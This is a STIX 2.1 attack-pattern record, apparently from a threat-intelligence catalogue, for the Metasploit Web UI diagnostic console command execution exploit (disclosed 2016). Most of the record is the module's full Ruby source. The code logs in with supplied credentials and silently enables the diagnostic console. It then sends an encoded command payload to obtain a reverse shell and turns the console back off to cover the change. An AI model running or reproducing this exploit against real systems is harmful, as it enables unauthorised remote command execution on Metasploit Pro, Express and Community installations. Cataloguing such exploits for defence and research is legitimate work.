{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6b0321da-d451-4906-9e2a-cae9fb708ec4",
    "created": "2024-08-14T17:08:48.271167Z",
    "modified": "2024-08-14T17:08:48.271171Z",
    "name": "Metasploit Web UI Diagnostic Console Command Execution",
    "description": " This module exploits the \"diagnostic console\" feature in the Metasploit Web UI to obtain a reverse shell.  The diagnostic console is able to be enabled or disabled by an administrator on Metasploit Pro and by an authenticated user on Metasploit Express and Metasploit Community. When enabled, the diagnostic console provides access to msfconsole via the web interface. An authenticated user can then use the console to execute shell commands.  NOTE: Valid credentials are required for this module.  Tested against:  Metasploit Community 4.1.0 Metasploit Community 4.8.2 Metasploit Community 4.12.0 ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/metasploit_webui_console_command_execution.rb",
            "external_id": "metasploit_webui_console_command_execution.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Metasploit Web UI Diagnostic Console Command Execution',\n      'Description'   => %q{\n        This module exploits the \"diagnostic console\" feature in the Metasploit\n        Web UI to obtain a reverse shell.\n\n        The diagnostic console is able to be enabled or disabled by an\n        administrator on Metasploit Pro and by an authenticated user on\n        Metasploit Express and Metasploit Community. When enabled, the\n        diagnostic console provides access to msfconsole via the web interface.\n        An authenticated user can then use the console to execute shell\n        commands.\n\n        NOTE: Valid credentials are required for this module.\n\n        Tested against:\n\n        Metasploit Community 4.1.0,\n        Metasploit Community 4.8.2,\n        Metasploit Community 4.12.0\n      },\n      'Author'        => [ 'Justin Steven' ],    # @justinsteven\n      'License'       => MSF_LICENSE,\n      'Privileged'    => true,\n      'Arch'          => ARCH_CMD,\n      'Payload'       => { 'PayloadType'  => 'cmd' },\n      'Targets'       =>\n        [\n          [ 'Unix',\n            {\n              'Platform'   => [ 'unix' ]\n            }\n          ],\n          [ 'Windows',\n            {\n              'Platform'   => [ 'windows' ]\n            }\n          ]\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate'  => '2016-08-23'\n      ))\n\n    register_options(\n      [\n        OptBool.new('SSL', [ true, 'Use SSL', true ]),\n        OptPort.new('RPORT', [ true, '', 3790 ]),\n        OptString.new('TARGETURI', [ true, 'Metasploit Web UI base path', '/' ]),\n        OptString.new('USERNAME', [ true,  'The user to authenticate as' ]),\n        OptString.new('PASSWORD', [ true,  'The password to authenticate with' ])\n      ])\n  end\n\n  def do_login()\n\n    print_status('Obtaining cookies and authenticity_token')\n\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => normalize_uri(target_uri.path, 'login'),\n    })\n\n    unless res\n      fail_with(Failure::NotFound, 'Failed to retrieve login page')\n    end\n\n    unless res.headers.include?('Set-Cookie') && res.body =~ /name=\"authenticity_token\"\\W+.*\\bvalue=\"([^\"]*)\"/\n      fail_with(Failure::UnexpectedReply, \"Couldn't find cookies or authenticity_token. Is TARGETURI set correctly?\")\n    end\n\n    authenticity_token = $1\n    session = res.get_cookies\n\n    print_status('Logging in')\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'user_sessions'),\n      'cookie'    => session,\n      'vars_post' =>\n        {\n          'utf8'                    => '\\xE2\\x9C\\x93',\n          'authenticity_token'      => authenticity_token,\n          'user_session[username]'  => datastore['USERNAME'],\n          'user_session[password]'  => datastore['PASSWORD'],\n          'commit'                  => 'Sign in'\n        }\n    })\n\n    unless res\n      fail_with(Failure::NotFound, 'Failed to log in')\n    end\n\n    return res.get_cookies, authenticity_token\n\n  end\n\n  def get_console_status(session)\n\n    print_status('Getting diagnostic console status and profile_id')\n\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => normalize_uri(target_uri.path, 'settings'),\n      'cookie'    => session,\n    })\n\n    unless res\n      fail_with(Failure::NotFound, 'Failed to get diagnostic console status or profile_id')\n    end\n\n    unless res.body =~ /\\bid=\"profile_id\"\\W+.*\\bvalue=\"([^\"]*)\"/\n      fail_with(Failure::UnexpectedReply, 'Failed to get profile_id')\n    end\n\n    profile_id = $1\n\n    if res.body =~ /<input\\W+.*\\b(id=\"allow_console_access\"\\W+.*\\bchecked=\"checked\"|checked=\"checked\"\\W+.*\\bid=\"allow_console_access\")/\n      console_status = true\n    elsif res.body =~ /<input\\W+.*\\bid=\"allow_console_access\"/\n      console_status = false\n    else\n      fail_with(Failure::UnexpectedReply, 'Failed to get diagnostic console status')\n    end\n\n    print_good(\"Console is currently: #{console_status ? 'Enabled' : 'Disabled'}\")\n\n    return console_status, profile_id\n\n  end\n\n  def set_console_status(session, authenticity_token, profile_id, new_console_status)\n    print_status(\"#{new_console_status ? 'Enabling' : 'Disabling'} diagnostic console\")\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'settings', 'update_profile'),\n      'cookie'    => session,\n      'vars_post' =>\n        {\n          'utf8'                    => '\\xE2\\x9C\\x93',\n          '_method'                 => 'patch',\n          'authenticity_token'      => authenticity_token,\n          'profile_id'              => profile_id,\n          'allow_console_access'    => new_console_status,\n          'commit'                  => 'Update Settings'\n        }\n    })\n\n    unless res\n      fail_with(Failure::NotFound, 'Failed to set status of diagnostic console')\n    end\n\n  end\n\n  def get_container_id(session, container_label)\n\n    container_label_singular = container_label.gsub(/s$/, \"\")\n\n    print_status(\"Getting ID of a valid #{container_label_singular}\")\n\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => normalize_uri(target_uri.path, container_label),\n      'cookie'    => session,\n    })\n\n    unless res && res.body =~ /\\bid=\"#{container_label_singular}_([^\"]*)\"/\n      print_warning(\"Failed to get a valid #{container_label_singular} ID\")\n      return\n    end\n\n    container_id = $1\n\n    vprint_good(\"Got: #{container_id}\")\n\n    container_id\n\n  end\n\n  def get_console(session, container_label, container_id)\n\n    print_status('Creating a console, getting its ID and authenticity_token')\n\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => normalize_uri(target_uri.path, container_label, container_id, 'console'),\n      'cookie'    => session,\n    })\n\n    unless res && res.headers['location']\n      fail_with(Failure::UnexpectedReply, 'Failed to get a console ID')\n    end\n\n    console_id = res.headers['location'].split('/')[-1]\n\n    vprint_good(\"Got console ID: #{console_id}\")\n\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => normalize_uri(target_uri.path, container_label, container_id, 'consoles', console_id),\n      'cookie'    => session,\n    })\n\n    unless res && res.body =~ /console_init\\('console', 'console', '([^']*)'/\n      fail_with(Failure::UnexpectedReply, 'Failed to get console authenticity_token')\n    end\n\n    console_authenticity_token = $1\n\n    return console_id, console_authenticity_token\n\n  end\n\n  def run_command(session, container_label, console_authenticity_token, container_id, console_id, command)\n\n    print_status('Running payload')\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, container_label, container_id, 'consoles', console_id),\n      'cookie'    => session,\n      'vars_post' =>\n        {\n          'read'                    => 'yes',\n          'cmd'                     => command,\n          'authenticity_token'      => console_authenticity_token,\n          'last_event'              => '0',\n          '_'                       => ''\n        }\n    })\n\n    unless res\n      fail_with(Failure::NotFound, 'Failed to run command')\n    end\n\n  end\n\n  def exploit\n\n    session, authenticity_token = do_login()\n\n    original_console_status, profile_id = get_console_status(session)\n\n    unless original_console_status\n      set_console_status(session, authenticity_token, profile_id, true)\n    end\n\n    if container_id = get_container_id(session, \"workspaces\")\n      # target calls them \"workspaces\"\n      container_label = \"workspaces\"\n    elsif container_id = get_container_id(session, \"projects\")\n      # target calls them \"projects\"\n      container_label = \"projects\"\n    else\n      fail_with(Failure::Unknown, 'Failed to get workspace ID or project ID. Cannot continue.')\n    end\n\n    console_id, console_authenticity_token = get_console(session, container_label,container_id)\n\n    run_command(session, container_label, console_authenticity_token,\n                container_id, console_id, payload.encoded)\n\n    unless original_console_status\n      set_console_status(session, authenticity_token, profile_id, false)\n    end\n\n    handler\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-08-23",
    "x_mitre_platforms": [
        "[ 'windows' ]"
    ]
}